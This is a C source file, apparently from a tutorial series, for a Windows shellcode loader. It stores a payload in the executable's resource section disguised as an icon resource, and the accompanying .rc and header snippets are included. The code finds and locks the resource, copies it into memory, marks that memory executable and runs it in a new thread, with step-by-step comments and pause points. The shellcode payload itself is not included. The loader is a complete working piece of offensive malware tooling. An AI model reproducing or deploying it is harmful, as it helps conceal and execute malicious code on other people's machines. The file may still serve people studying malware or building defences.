
// simple shellcode loader in C
// good example of structure to ensure shellcode ends up in .rsrc section of PE file
// NOTE we have 3 extra files here - calc.ico, resources.h, resources.rc (SHOWN BELOW)
// we import custom header file
// we no longer initialize payload inside this file, instead extract it from header
// 22 April 2024

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "resources.h" //first thing to note is inclusion of custom header file


int error_handler(const char *message, int errorCode) {
    printf("%s (Error Code: %d)\n", message, errorCode);
    return errorCode;
}

void forced_breakpoint(const char *message) {
    printf("%s\n", message);
    printf("hit enter to continue!\n");
    getchar();
}

int main(void) {

	// so we once again declare payload + length INSIDE main(), but this time they are uninitialized
	unsigned char * payload;
	unsigned int payload_length;
	
	// This is all our new code which extracts the payload from resources section

	// FINDS THE RESOURCE
	HRSRC res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	if (res == NULL) {
	    return error_handler("Failed to find resource", GetLastError());
	}

	// LOADS THE RESOURCE
	HGLOBAL resHandle = LoadResource(NULL, res);
	if (resHandle == NULL) {
	    return error_handler("Failed to load resource", GetLastError());
	}

	// LOCKS THE RESOURCE IN PLACE
	payload = (char *) LockResource(resHandle);
	if (payload == NULL) {
	    return error_handler("Failed to lock resource", GetLastError());
	}

	// DETERMINES RESOURCE SIZE
	payload_length = SizeofResource(NULL, res);
	if (payload_length == 0) {
	    return error_handler("Failed to get resource size", GetLastError());
	}

	// STEP 1: Allocate a memory buffer for payload
	void * payload_mem = VirtualAlloc(0, payload_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (payload_mem == NULL) {
	    return error_handler("Failed to allocate memory", GetLastError());
    }
	else {
    int pointer_width = sizeof(void*) * 2;  // Calculate the width required for the pointer in hexadecimal
    printf("%-20s : 0x%0*p\n", "payload is stored at: ", pointer_width, (void *)payload);
    printf("%-20s : 0x%0*p\n", "memory allocated at: ", pointer_width, (void *)payload_mem);
	}

    forced_breakpoint("memory has been allocated");

	// STEP 2: Copy payload to allocated buffer
	RtlMoveMemory(payload_mem, payload, payload_length);

    forced_breakpoint("payload has been copied to buffer.");

	// STEP 3: change memory protection constants to allow execution
	DWORD oldprotect = 0; 
	BOOL change_perm = VirtualProtect(payload_mem, payload_length, PAGE_EXECUTE_READ, &oldprotect);

	if (change_perm == 0) {
		return error_handler("Failed to change memory permissions", GetLastError());
    }

	forced_breakpoint("memory protection constants have been updated.");

	// STEP 4: Execute payload

	HANDLE threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) payload_mem, 0, 0, 0);
	if (threadHandle == NULL) {
		return error_handler("Failed to execute payload", GetLastError());
    }

 	// Ensure payload completes

    DWORD waitResult = WaitForSingleObject(threadHandle, 5000); 
    switch (waitResult) {
        case WAIT_OBJECT_0:
            printf("The thread has finished execution.\n");
            break;
        case WAIT_TIMEOUT:
            printf("The wait operation timed out. The thread is still running.\n");
            break;
        case WAIT_FAILED:
            printf("Failed to wait on thread handle. Error: %lu\n", GetLastError());
            break;
        default:
            printf("Unknown wait result.\n");
    }

    CloseHandle(threadHandle);
    VirtualFree(payload_mem, 0, MEM_RELEASE);
    
	return 0;

}

/*-----------------------THESE_SHOULD_BE_SEPERATE_FILES_OBVS-----------------------------*/
/*--------------------------------_resources.rc_-----------------------------------------*/
#include "resources.h"

FAVICON_ICO RCDATA calc.ico

/*--------------------------------_resources.h_-----------------------------------------*/
#define FAVICON_ICO 100




